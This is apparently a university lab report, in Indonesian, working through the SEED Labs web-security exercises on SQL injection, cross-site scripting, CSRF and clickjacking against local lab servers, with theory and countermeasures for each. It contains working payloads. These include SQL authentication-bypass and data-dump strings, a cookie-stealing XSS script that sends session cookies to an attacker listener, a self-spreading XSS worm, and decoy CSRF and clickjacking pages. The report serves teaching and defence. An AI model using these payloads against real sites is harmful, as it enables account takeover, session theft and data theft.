# R4 — Web Security Attacks

> **SEED Labs 2.0 · Ubuntu 20.04**
> Muhammad Tamim Nugraha — 5024231060 · Teknik Komputer ITS 2023

---

## Daftar Isi

1. [SQL Injection](#1-sql-injection)
2. [Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
3. [Cross-Site Request Forgery (CSRF)](#3-cross-site-request-forgery-csrf)
4. [Clickjacking](#4-clickjacking)
5. [Kesimpulan](#kesimpulan)
6. [Referensi](#referensi)

---

## 1. SQL Injection

### 1.1 Tujuan Eksperimen

Memahami kerentanan SQL Injection pada aplikasi web yang mengkonstruksi query SQL secara dinamis dari input pengguna tanpa sanitasi yang memadai. Mendemonstrasikan berbagai teknik SQLi termasuk authentication bypass, data exfiltration, dan database modification.

### 1.2 Dasar Teori

SQL Injection terjadi ketika input pengguna dimasukkan langsung ke dalam query SQL tanpa *parameterization* atau *escaping*:

```php
// RENTAN — String concatenation
$sql = "SELECT * FROM users WHERE name='$username' AND password='$password'";

// AMAN — Prepared statement
$stmt = $conn->prepare("SELECT * FROM users WHERE name=? AND password=?");
$stmt->bind_param("ss", $username, $password);
```

**Ketika attacker memasukkan `' OR 1=1 #` sebagai username:**

```sql
-- Query asli:
SELECT * FROM users WHERE name='' OR 1=1 #' AND password=''
                              ───────────  ─
                              Selalu TRUE    Komentar (sisa query diabaikan)
```

### 1.3 Langkah Eksploitasi

#### Persiapan SEED Lab Environment

```bash
# Jalankan Docker container SEED Labs untuk SQL Injection
cd seed-labs/category-web/Web_SQL_Injection/Labsetup
docker-compose up -d

# Verifikasi container berjalan
docker ps
# CONTAINER ID  IMAGE                  PORTS
# xxxxxxxxxxxx  seed-image-www-sqli    0.0.0.0:80->80/tcp

# Tambahkan entry hosts
echo "10.9.0.5 www.seed-server.com" | sudo tee -a /etc/hosts

# Akses aplikasi web
# Browser: http://www.seed-server.com
```

#### Task 1: Authentication Bypass (Login Page)

```
# Pada halaman login, masukkan:
Username: admin' #
Password: (kosongkan atau isi sembarang)
```

```sql
-- Query yang dihasilkan:
SELECT id, name, eid, salary, ssn
FROM credential
WHERE name='admin' #' AND password=sha1('')

-- Setelah injeksi:
-- 'admin' → match user admin
-- #       → komentar MySQL, sisa query diabaikan
-- Password check DILEWATI sepenuhnya
```

```bash
# Menggunakan curl untuk automated testing
curl -v -d "username=admin'%20%23&Password=anything" \
    http://www.seed-server.com/unsafe_home.php

# Variant lain:
# username: admin'--
# username: ' OR 1=1 #
# username: ' OR '1'='1
# username: admin' OR 1=1 LIMIT 1 #
```

#### Task 2: Login sebagai User Lain

```
# Login sebagai Alice tanpa mengetahui password:
Username: Alice' #
Password: (sembarang)

# Login sebagai user pertama di database:
Username: ' OR 1=1 LIMIT 1 #
Password: (sembarang)
```

#### Task 3: Data Exfiltration dengan UNION

```
# Pada field pencarian atau URL parameter:
# Asumsi query: SELECT name, eid, salary FROM credential WHERE eid='$input'

# Step 1: Tentukan jumlah kolom dengan ORDER BY
' ORDER BY 1 #      → OK
' ORDER BY 2 #      → OK
' ORDER BY 3 #      → OK
' ORDER BY 6 #      → Error → Tabel memiliki 5 kolom

# Step 2: UNION SELECT untuk ekstrak data
' UNION SELECT 1,2,3,4,5 #

# Step 3: Ekstrak nama database dan versi
' UNION SELECT database(),version(),user(),4,5 #

# Step 4: Ekstrak nama tabel
' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=database() #

# Step 5: Ekstrak nama kolom
' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='credential' #

# Step 6: Dump semua data
' UNION SELECT name,eid,salary,ssn,password FROM credential #
```

#### Task 4: SQL Injection untuk Modifikasi Data

```
# Pada halaman edit profile, gunakan field yang vulnerable:
# Misalnya field "Nickname":

Alice', salary='999999' WHERE name='Alice' #

# Query yang dihasilkan:
UPDATE credential SET
    nickname='Alice', salary='999999' WHERE name='Alice' #',
    email='...',
    address='...'
WHERE ...;

# Hasilnya: salary Alice berubah menjadi 999999
```

```
# Mengubah password user lain:
# Di field nickname:
', password=sha1('hacked') WHERE name='admin' #

# Query:
UPDATE credential SET
    nickname='', password=sha1('hacked') WHERE name='admin' #',
    email='...'
WHERE ...;

# Sekarang password admin = 'hacked'
```

#### Task 5: Second-Order SQL Injection

```sql
-- Attacker mendaftar dengan username:
-- admin'--

-- Saat username disimpan ke database (INSERT, properly escaped):
INSERT INTO users(username, password) VALUES ('admin\'--', 'hash');
-- Tersimpan di DB sebagai: admin'--

-- Saat user mengubah password (query menggunakan data dari DB):
UPDATE users SET password=sha1('newpass') WHERE username='admin'--'
-- Efektif: UPDATE users SET password=sha1('newpass') WHERE username='admin'
-- Password ADMIN yang berubah, bukan admin'--
```

#### Task 6: Countermeasures

```php
<?php
// === SOLUSI 1: Prepared Statements (Parameterized Queries) ===
$stmt = $conn->prepare("SELECT * FROM credential WHERE name=? AND password=sha1(?)");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();

// Input apapun diperlakukan sebagai DATA, bukan SQL code
// admin' # → dicari secara literal sebagai username "admin' #"

// === SOLUSI 2: Stored Procedures ===
// Definisi di MySQL:
// DELIMITER //
// CREATE PROCEDURE login(IN p_name VARCHAR(50), IN p_pass VARCHAR(50))
// BEGIN
//     SELECT * FROM credential WHERE name=p_name AND password=sha1(p_pass);
// END //

$stmt = $conn->prepare("CALL login(?, ?)");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();

// === SOLUSI 3: Input Validation ===
$username = preg_replace('/[^a-zA-Z0-9_]/', '', $username);
// Menghapus semua karakter non-alfanumerik

// === SOLUSI 4: Escaping ===
$username = mysqli_real_escape_string($conn, $username);
// Escape karakter khusus: ' → \'
?>
```

### 1.4 Analisis Percobaan

**Mengapa SQL Injection bekerja:**

1. **Mixing Code and Data**: SQL menggunakan format di mana kode (perintah SQL) dan data (input user) dicampur dalam satu string. Tanpa pemisahan yang jelas, data bisa diinterpretasikan sebagai kode.

2. **Karakter Meta**: Karakter seperti `'`, `"`, `;`, `#`, `--` memiliki makna khusus dalam SQL. Input yang mengandung karakter ini mengubah struktur query.

3. **Trust Boundary Violation**: Aplikasi mempercayai input pengguna tanpa validasi, melanggar prinsip "never trust user input".

### 1.5 Bukti Eksploitasi

![Bukti SQL Injection — Auth Bypass](images/placeholder-r4-sqli-login.png)

![Bukti SQL Injection — Data Dump](images/placeholder-r4-sqli-union.png)

---

## 2. Cross-Site Scripting (XSS)

### 2.1 Tujuan Eksperimen

Memahami tiga tipe XSS (Reflected, Stored, DOM-based) dan bagaimana penyerang dapat menginjeksi script berbahaya ke halaman web yang dilihat oleh korban. Mendemonstrasikan session hijacking, cookie theft, dan DOM manipulation.

### 2.2 Dasar Teori

| Tipe XSS | Mekanisme | Persistensi | Contoh Vektor |
|---|---|---|---|
| **Reflected** | Input di-reflect langsung di response | Non-persistent | URL parameter |
| **Stored** | Payload disimpan di database/server | Persistent | Forum post, profile |
| **DOM-based** | Modifikasi DOM di client-side | Non-persistent | JavaScript URL handling |

**Same-Origin Policy (SOP)**: Browser membatasi script dari satu origin untuk mengakses data dari origin lain. XSS melanggar ini karena script yang diinjeksi berjalan dalam konteks origin target.

### 2.3 Langkah Eksploitasi

#### Persiapan

```bash
# Jalankan SEED XSS Lab (Elgg social network)
cd seed-labs/category-web/Web_XSS_Elgg/Labsetup
docker-compose up -d

# Tambahkan hosts entry
echo "10.9.0.5 www.xss-lab.com" | sudo tee -a /etc/hosts

# Akun yang tersedia di lab:
# alice:seedalice | boby:seedboby | charlie:seedcharlie | admin:seedelgg
```

#### Task 1: Reflected XSS

```
# Masukkan di field pencarian atau URL parameter:
<script>alert('XSS Reflected!')</script>

# Melalui URL:
http://www.xss-lab.com/search?q=<script>alert('XSS')</script>

# Variasi payload yang bypass filter sederhana:
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
<input onfocus="alert('XSS')" autofocus>
```

#### Task 2: Stored XSS — Cookie Theft

```
# Di halaman profil Elgg (field "Brief Description" atau "About Me"):
# Masukkan payload berikut:

<script>
document.write('<img src="http://10.9.0.1:5555?cookie=' +
    encodeURIComponent(document.cookie) + '" />');
</script>
```

```bash
# Di mesin attacker (10.9.0.1), jalankan listener:
nc -lvp 5555

# Saat korban (misalnya Alice) mengunjungi profil attacker,
# browser korban mengirim cookie ke server attacker:

# Output di listener:
# GET /?cookie=Elgg%3Dxxxxxxxxxxxxxxxxxxxxxxxxxx HTTP/1.1
# Host: 10.9.0.1:5555
# ...
```

#### Task 3: Session Hijacking

```
# Setelah mendapatkan cookie korban, gunakan untuk impersonasi:

# Menggunakan curl dengan stolen cookie:
curl -b "Elgg=STOLEN_SESSION_ID" http://www.xss-lab.com/profile/alice

# Atau di browser attacker, set cookie melalui DevTools Console:
# document.cookie = "Elgg=STOLEN_SESSION_ID; path=/";
# Lalu navigasi ke http://www.xss-lab.com → login sebagai Alice!
```

#### Task 4: Stored XSS — Self-Propagating Worm (Samy-style)

```html
<!-- XSS Worm: Payload yang menyebar otomatis -->
<!-- Saat korban melihat profil attacker, worm akan: -->
<!-- 1. Menambahkan attacker sebagai friend -->
<!-- 2. Menyalin dirinya ke profil korban -->

<script type="text/javascript" id="worm">
var headerTag = '<script type="text/javascript" id="worm">';
var jsCode = document.getElementById("worm").innerHTML;
var tailTag = "</" + "script>";

// Construct self-propagating payload
var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

// Step 1: Ambil CSRF token dari halaman
var ajax = new XMLHttpRequest();
ajax.open("GET", "http://www.xss-lab.com/action/friends/add?friend=ATTACKER_GUID&__elgg_ts=" +
           elgg.security.token.__elgg_ts +
           "&__elgg_token=" + elgg.security.token.__elgg_token, true);
ajax.send();

// Step 2: Modifikasi profil korban untuk menyebarkan worm
var ajax2 = new XMLHttpRequest();
ajax2.open("POST", "http://www.xss-lab.com/action/profile/edit", true);
ajax2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

var content = "name=" + elgg.session.user.name +
              "&description=" + wormCode +
              "&guid=" + elgg.session.user.guid +
              "&__elgg_ts=" + elgg.security.token.__elgg_ts +
              "&__elgg_token=" + elgg.security.token.__elgg_token;

ajax2.send(content);

alert("You have been infected by the XSS Worm!");
</script>
```

#### Task 5: DOM-Based XSS

```html
<!-- Halaman rentan dengan DOM-based XSS -->
<!-- vulnerable.html -->
<html>
<body>
    <h1>Welcome</h1>
    <p id="greeting"></p>
    <script>
        // Kerentanan: mengambil data dari URL dan memasukkan ke DOM
        var name = new URLSearchParams(window.location.search).get('name');
        document.getElementById("greeting").innerHTML = "Hello, " + name + "!";
        // Jika name = <img src=x onerror=alert('DOM-XSS')>
        // → Script dieksekusi tanpa server-side reflection
    </script>
</body>
</html>
```

```
# Exploit URL:
http://www.xss-lab.com/vulnerable.html?name=<img src=x onerror=alert('DOM-XSS')>
```

#### Task 6: Countermeasures

```bash
# 1. Content Security Policy (CSP) Header
# Tambahkan di konfigurasi Apache:
sudo tee /etc/apache2/conf-enabled/security.conf << 'EOF'
Header set Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
Header set X-Content-Type-Options "nosniff"
Header set X-XSS-Protection "1; mode=block"
EOF

# 2. HttpOnly Cookie Flag (mencegah JavaScript akses cookie)
# Di PHP:
# session_set_cookie_params(['httponly' => true, 'secure' => true, 'samesite' => 'Strict']);

# 3. Encoding output
# PHP: htmlspecialchars($input, ENT_QUOTES, 'UTF-8')
# JavaScript: textContent instead of innerHTML
```

```php
<?php
// === Server-side XSS Prevention ===

// Output encoding — SELALU encode sebelum render ke HTML
$safe_output = htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
echo "<p>Hello, $safe_output</p>";

// Input: <script>alert('XSS')</script>
// Output: &lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;
// Browser menampilkan teks literal, bukan mengeksekusi script
?>
```

### 2.4 Analisis Percobaan

**Mengapa XSS berbahaya:**

1. **Same-Origin Context**: Script yang diinjeksi berjalan dalam konteks origin aplikasi target. Ini berarti script memiliki akses penuh ke cookies, DOM, dan API browser untuk origin tersebut.

2. **Cookie Theft → Session Hijacking**: Dengan mengakses `document.cookie`, penyerang mendapatkan session ID korban. Karena server web mengidentifikasi sesi berdasarkan cookie, penyerang dapat *impersonate* korban.

3. **Self-Propagating Worms**: XSS stored memungkinkan worm yang menyebar secara otomatis (seperti Samy Worm di MySpace, 2005) yang menginfeksi setiap profil yang dikunjungi.

4. **Stored vs Reflected**: Stored XSS lebih berbahaya karena payload tersimpan permanen dan menyerang setiap pengunjung halaman. Reflected XSS memerlukan korban untuk mengklik link berbahaya.

### 2.5 Bukti Eksploitasi

![Bukti XSS — Alert Box](images/placeholder-r4-xss-alert.png)

![Bukti XSS — Cookie Theft](images/placeholder-r4-xss-cookie.png)

---

## 3. Cross-Site Request Forgery (CSRF)

### 3.1 Tujuan Eksperimen

Memahami serangan *Cross-Site Request Forgery* di mana penyerang membuat korban mengirimkan HTTP request ke aplikasi web tanpa sepengetahuan korban. Mendemonstrasikan bagaimana request forgery dapat mengubah data profil, kata sandi, atau melakukan transaksi.

### 3.2 Dasar Teori

**Alur serangan CSRF:**

```
1. Korban login ke bank.com (session cookie tersimpan di browser)
2. Korban mengunjungi evil.com (situs attacker)
3. evil.com berisi:
   <img src="https://bank.com/transfer?to=attacker&amount=10000">
4. Browser korban mengirim request ke bank.com
   DENGAN menyertakan session cookie otomatis!
5. Bank memproses transfer karena request tampak legitimate
```

**Perbedaan CSRF vs XSS:**

| Aspek | CSRF | XSS |
|---|---|---|
| **Target** | Request forgery | Script injection |
| **Memanfaatkan** | Trust server terhadap browser | Trust user terhadap server |
| **Execution** | Server-side | Client-side |
| **Memerlukan** | Korban sudah login | Vulnerability di server |

### 3.3 Langkah Eksploitasi

#### Persiapan

```bash
# Jalankan SEED CSRF Lab
cd seed-labs/category-web/Web_CSRF_Elgg/Labsetup
docker-compose up -d

# Hosts entry
echo "10.9.0.5 www.csrf-lab.com" | sudo tee -a /etc/hosts
echo "10.9.0.105 www.attacker.com" | sudo tee -a /etc/hosts
```

#### Task 1: CSRF GET Request — Edit Profil Korban

```html
<!-- attacker_page.html — Hosted di www.attacker.com -->
<!DOCTYPE html>
<html>
<head>
    <title>Win a Free iPhone!</title>
</head>
<body>
    <h1>🎉 Congratulations! You Won!</h1>
    <p>Click the button below to claim your prize!</p>

    <!-- Hidden CSRF attack via GET request -->
    <!-- Saat halaman ini dimuat, browser korban mengirim request
         ke csrf-lab.com untuk mengubah profil -->
    <img src="http://www.csrf-lab.com/action/profile/edit?name=Alice&description=HACKED_BY_CSRF&guid=ALICE_GUID&__elgg_ts=TIMESTAMP&__elgg_token=TOKEN"
         style="display:none;" />

    <!-- Alternatif: form yang auto-submit -->
    <img src="http://www.csrf-lab.com/action/friends/add?friend=ATTACKER_GUID"
         width="0" height="0" />

    <button onclick="alert('Prize claimed!')">Claim Prize!</button>
</body>
</html>
```

#### Task 2: CSRF POST Request — Auto-Submitting Form

```html
<!-- csrf_post.html — POST-based CSRF attack -->
<!DOCTYPE html>
<html>
<body onload="document.getElementById('csrf-form').submit();">
    <h1>Loading...</h1>

    <!-- Hidden form yang auto-submit saat halaman dimuat -->
    <form id="csrf-form" method="POST"
          action="http://www.csrf-lab.com/action/profile/edit"
          style="display:none;">

        <input type="hidden" name="name"        value="Alice" />
        <input type="hidden" name="description"  value="Profile hijacked via CSRF!" />
        <input type="hidden" name="accesslevel[description]" value="2" />
        <input type="hidden" name="briefdescription" value="CSRFED" />
        <input type="hidden" name="accesslevel[briefdescription]" value="2" />
        <input type="hidden" name="guid"         value="ALICE_GUID" />

        <!-- Note: Elgg menggunakan token anti-CSRF -->
        <!-- Serangan ini berhasil JIKA token validation dinonaktifkan -->
        <input type="hidden" name="__elgg_token" value="" />
        <input type="hidden" name="__elgg_ts"    value="" />

        <input type="submit" value="Submit" />
    </form>
</body>
</html>
```

#### Task 3: CSRF untuk Mengubah Password

```html
<!-- csrf_password.html — Mengubah password korban -->
<!DOCTYPE html>
<html>
<body>
    <iframe style="display:none;" name="csrf-frame"></iframe>

    <form method="POST" target="csrf-frame"
          action="http://www.csrf-lab.com/action/profile/edit"
          id="csrf-form">

        <input type="hidden" name="password"  value="attacker123" />
        <input type="hidden" name="password2" value="attacker123" />
        <input type="hidden" name="guid"      value="VICTIM_GUID" />
    </form>

    <script>
        document.getElementById("csrf-form").submit();
    </script>

    <h1>Loading content...</h1>
</body>
</html>
```

#### Task 4: CSRF via XMLHttpRequest (dengan XSS chain)

```javascript
// Jika attacker sudah memiliki XSS vulnerability,
// mereka bisa membuat CSRF request via JavaScript:

var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.csrf-lab.com/action/profile/edit", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials = true; // Kirim cookies

var params = "name=Alice" +
             "&description=Modified+via+CSRF+XHR" +
             "&guid=" + victimGuid;

xhr.send(params);
```

#### Task 5: Countermeasures

```php
<?php
// === SOLUSI 1: Anti-CSRF Token (Synchronizer Token Pattern) ===

// Generate token saat halaman dimuat:
session_start();
$csrf_token = bin2hex(random_bytes(32));
$_SESSION['csrf_token'] = $csrf_token;

// Sematkan di form:
echo '<input type="hidden" name="csrf_token" value="' . $csrf_token . '">';

// Validasi saat request diterima:
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die("CSRF Attack Detected!");
}

// === SOLUSI 2: SameSite Cookie Attribute ===
// Set di server:
// Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly

// SameSite=Strict: Cookie TIDAK dikirim pada cross-site request
// SameSite=Lax:    Cookie dikirim pada top-level navigation GET
// SameSite=None:   Cookie selalu dikirim (harus dengan Secure)

// === SOLUSI 3: Referer/Origin Header Validation ===
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
$referer = $_SERVER['HTTP_REFERER'] ?? '';

if (strpos($origin, 'www.csrf-lab.com') === false &&
    strpos($referer, 'www.csrf-lab.com') === false) {
    die("Invalid request origin!");
}
?>
```

### 3.4 Analisis Percobaan

**Mengapa CSRF berhasil:**

1. **Automatic Cookie Attachment**: Browser secara otomatis menyertakan cookies yang relevan pada setiap request ke domain target, terlepas dari mana request berasal. Ini adalah fitur browser yang legitimate, tetapi dieksploitasi oleh CSRF.

2. **Server Tidak Memvalidasi Origin**: Server hanya memeriksa apakah request memiliki session cookie yang valid, tanpa memeriksa dari mana request berasal.

3. **Invisible to User**: Request CSRF dapat dikirim melalui tag `<img>`, `<iframe>`, atau auto-submitting form yang tidak terlihat oleh pengguna.

**Mengapa token anti-CSRF efektif:**
- Token unik per sesi/per form yang tidak bisa diprediksi attacker
- Token disematkan di halaman (hidden field) dan divalidasi di server
- Attacker di domain berbeda tidak bisa membaca token (SOP mencegah cross-origin reads)

### 3.5 Bukti Eksploitasi

![Bukti CSRF — Profile Modification](images/placeholder-r4-csrf.png)

---

## 4. Clickjacking

### 4.1 Tujuan Eksperimen

Memahami serangan *Clickjacking* (UI Redressing) di mana penyerang melapisi halaman web target yang transparan di atas halaman yang terlihat oleh korban, sehingga klik korban pada elemen yang terlihat sebenarnya mendarat pada elemen tersembunyi di halaman target.

### 4.2 Dasar Teori

```
┌─────────────────────────────────────┐
│  Halaman Attacker (terlihat)        │
│                                     │
│  ┌─────────────────┐                │
│  │  "Click here    │                │
│  │  for free gift!"│                │
│  └─────────────────┘                │
│                                     │
│  ┌─────────────────────────────┐    │  ← iframe transparan (opacity: 0)
│  │  Target Website (hidden)    │    │     berisi halaman target
│  │  ┌────────────┐             │    │
│  │  │ Delete     │  ◄──────────│────│── Posisi "Delete Account" tepat
│  │  │ Account    │             │    │     di atas "Click here for gift"
│  │  └────────────┘             │    │
│  └─────────────────────────────┘    │
└─────────────────────────────────────┘
```

### 4.3 Langkah Eksploitasi

#### Task 1: Basic Clickjacking

```html
<!-- clickjack.html — Basic Clickjacking Attack -->
<!DOCTYPE html>
<html>
<head>
    <title>Amazing Deals!</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #1a1a2e;
            color: white;
            text-align: center;
            padding-top: 100px;
        }

        .bait-button {
            background: linear-gradient(135deg, #e94560, #0f3460);
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 22px;
            border-radius: 10px;
            cursor: pointer;
            position: relative;
            z-index: 1;
        }

        /* iframe transparan yang menutupi tombol bait */
        .target-frame {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.0001;  /* Hampir sepenuhnya transparan */
            z-index: 2;       /* Di ATAS tombol bait */
            border: none;
        }

        /* Untuk debugging: buat semi-transparan */
        .target-frame.debug {
            opacity: 0.3;
            border: 2px solid red;
        }
    </style>
</head>
<body>
    <h1>🎁 You Won a Free Prize!</h1>
    <p>Click the button below to claim your reward!</p>

    <div style="position: relative; display: inline-block;">
        <button class="bait-button">🎉 CLAIM FREE PRIZE!</button>

        <!-- iframe berisi halaman target, posisi diatur agar
             tombol "Delete Account" tepat di atas tombol bait -->
        <iframe src="http://www.csrf-lab.com/settings/delete"
                class="target-frame"
                scrolling="no">
        </iframe>
    </div>

    <p><small>* Offer valid while supplies last</small></p>
</body>
</html>
```

#### Task 2: Clickjacking dengan Positioning Presisi

```html
<!-- clickjack_precise.html — Posisi iframe yang presisi -->
<!DOCTYPE html>
<html>
<head>
    <style>
        .container {
            position: relative;
            width: 500px;
            height: 300px;
            margin: 50px auto;
            overflow: hidden;
        }

        /* Pindahkan konten iframe agar tombol target
           tepat di posisi yang diinginkan */
        .target-frame {
            position: absolute;
            /* Geser iframe ke kiri dan atas untuk memposisikan
               tombol target di lokasi yang tepat */
            left: -340px;
            top: -265px;
            width: 1000px;
            height: 800px;
            opacity: 0.0001;
            z-index: 10;
            border: none;
            pointer-events: auto;
        }

        .bait {
            position: absolute;
            left: 50px;
            top: 80px;
            padding: 15px 30px;
            background: #4CAF50;
            color: white;
            border: none;
            font-size: 18px;
            cursor: pointer;
            z-index: 1;
        }
    </style>
</head>
<body>
    <h1>Game: Click the Button!</h1>
    <div class="container">
        <button class="bait">START GAME</button>
        <iframe class="target-frame"
                src="http://www.csrf-lab.com/action/friends/add?friend=ATTACKER_GUID">
        </iframe>
    </div>
</body>
</html>
```

#### Task 3: Multi-Click Clickjacking (Likejacking)

```html
<!-- likejack.html — Clickjacking pada tombol Like/Follow -->
<!DOCTYPE html>
<html>
<head>
    <style>
        .game-area {
            position: relative;
            width: 600px;
            height: 400px;
            margin: 20px auto;
            background: #222;
            border-radius: 10px;
            overflow: hidden;
        }

        .game-target {
            position: absolute;
            width: 60px;
            height: 60px;
            background: #ff6b6b;
            border-radius: 50%;
            cursor: pointer;
            /* Animasi untuk membuat game terlihat nyata */
            animation: moveTarget 2s ease-in-out infinite alternate;
        }

        @keyframes moveTarget {
            from { left: 100px; top: 150px; }
            to { left: 350px; top: 200px; }
        }

        /* iframe Follow/Like button yang invisible */
        .hidden-action {
            position: absolute;
            left: 200px;    /* Sesuaikan dengan posisi target game */
            top: 170px;
            width: 200px;
            height: 80px;
            opacity: 0;
            z-index: 100;
        }
    </style>
</head>
<body>
    <h1>🎮 Whack-a-Mole Game!</h1>
    <p>Score: <span id="score">0</span> — Click the red circles!</p>

    <div class="game-area">
        <div class="game-target" onclick="document.getElementById('score').textContent++"></div>
        <iframe class="hidden-action"
                src="http://www.csrf-lab.com/action/friends/add?friend=ATTACKER_GUID">
        </iframe>
    </div>
</body>
</html>
```

#### Task 4: Countermeasures

```bash
# === SOLUSI 1: X-Frame-Options Header ===
# Tambahkan di konfigurasi Apache/Nginx:

# Apache:
echo 'Header always set X-Frame-Options "DENY"' | \
    sudo tee /etc/apache2/conf-enabled/clickjack.conf
sudo systemctl reload apache2

# Nilai:
# DENY             — Halaman tidak boleh dimuat di iframe manapun
# SAMEORIGIN       — Hanya boleh dimuat di iframe dari domain yang sama
# ALLOW-FROM uri   — Hanya boleh dimuat dari URI tertentu (deprecated)

# === SOLUSI 2: Content-Security-Policy frame-ancestors ===
# Lebih modern dan fleksibel dari X-Frame-Options:
# Header set Content-Security-Policy "frame-ancestors 'self'"
# frame-ancestors 'none'     → setara DENY
# frame-ancestors 'self'     → setara SAMEORIGIN
# frame-ancestors example.com → izinkan dari example.com saja
```

```javascript
// === SOLUSI 3: JavaScript Frame-Busting ===
// Pada halaman yang dilindungi, tambahkan:

if (window.top !== window.self) {
    // Halaman dimuat di dalam iframe — redirect ke top level
    window.top.location = window.self.location;
}

// Versi yang lebih robust:
(function() {
    if (self !== top) {
        // Sembunyikan konten
        document.body.style.display = 'none';
        // Redirect
        top.location = self.location;
    }
})();

// CATATAN: Frame-busting JavaScript bisa di-bypass oleh attacker
// menggunakan sandbox="allow-forms" pada iframe
// → Gunakan X-Frame-Options/CSP sebagai solusi utama
```

### 4.4 Analisis Percobaan

**Mengapa clickjacking berhasil:**

1. **CSS Transparency**: Property `opacity: 0` membuat elemen sepenuhnya transparan secara visual, tetapi tetap interaktif (*clickable*). Browser mengeksekusi klik pada elemen di z-index tertinggi, bukan elemen yang terlihat.

2. **iframe Cross-Origin**: Browser memungkinkan halaman untuk memuat situs lain dalam `<iframe>` secara default. Attacker memanfaatkan ini untuk menampilkan halaman target di dalam halaman bait.

3. **User Interaction**: Korban secara sukarela mengklik — mereka berpikir mereka mengklik tombol di halaman attacker, tetapi sebenarnya mengklik tombol di halaman target. Ini membuat serangan sulit dideteksi.

4. **Session Riding**: Sama seperti CSRF, browser menyertakan cookies saat memuat halaman target di iframe, sehingga aksi dilakukan dalam konteks sesi korban yang sudah login.

### 4.5 Bukti Eksploitasi

![Bukti Clickjacking Attack](images/placeholder-r4-clickjack.png)

---

## Kesimpulan

| Serangan | OWASP Rank | Attack Vector | Dampak | Pertahanan Utama |
|---|---|---|---|---|
| **SQL Injection** | A03:2021 | User input → SQL query | Data breach, auth bypass | Prepared statements |
| **XSS** | A03:2021 | User input → HTML/JS | Session hijacking, worm | Output encoding, CSP |
| **CSRF** | A01:2021 | Cross-site request | Unauthorized actions | Anti-CSRF token, SameSite |
| **Clickjacking** | — | UI overlay (iframe) | UI manipulation | X-Frame-Options, CSP |

**Prinsip keamanan web yang ditunjukkan:**

1. **Never Trust User Input**: Semua input harus divalidasi dan di-sanitasi
2. **Defense in Depth**: Kombinasikan beberapa lapisan pertahanan (input validation + output encoding + CSP + HTTPOnly cookies)
3. **Secure by Default**: Framework modern (Django, Laravel, Rails) sudah menyertakan proteksi bawaan — pastikan tidak dinonaktifkan
4. **Same-Origin Policy**: Fondasi keamanan web — pahami batas dan lubangnya

---

## Referensi

1. Du, W. (2019). *Computer & Internet Security*, Chapter 10-13: SQL Injection, XSS, CSRF.
2. SEED Lab — SQL Injection: [https://seedsecuritylabs.org/Labs_20.04/Web/Web_SQL_Injection/](https://seedsecuritylabs.org/Labs_20.04/Web/Web_SQL_Injection/)
3. SEED Lab — XSS: [https://seedsecuritylabs.org/Labs_20.04/Web/Web_XSS_Elgg/](https://seedsecuritylabs.org/Labs_20.04/Web/Web_XSS_Elgg/)
4. SEED Lab — CSRF: [https://seedsecuritylabs.org/Labs_20.04/Web/Web_CSRF_Elgg/](https://seedsecuritylabs.org/Labs_20.04/Web/Web_CSRF_Elgg/)
5. OWASP Top 10 (2021): [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/)
6. CWE-89 (SQL Injection): [https://cwe.mitre.org/data/definitions/89.html](https://cwe.mitre.org/data/definitions/89.html)
7. CWE-79 (XSS): [https://cwe.mitre.org/data/definitions/79.html](https://cwe.mitre.org/data/definitions/79.html)
8. CWE-352 (CSRF): [https://cwe.mitre.org/data/definitions/352.html](https://cwe.mitre.org/data/definitions/352.html)

---

<p align="center"><em>R4 — Web Security Attacks · Muhammad Tamim Nugraha · 5024231060</em></p>
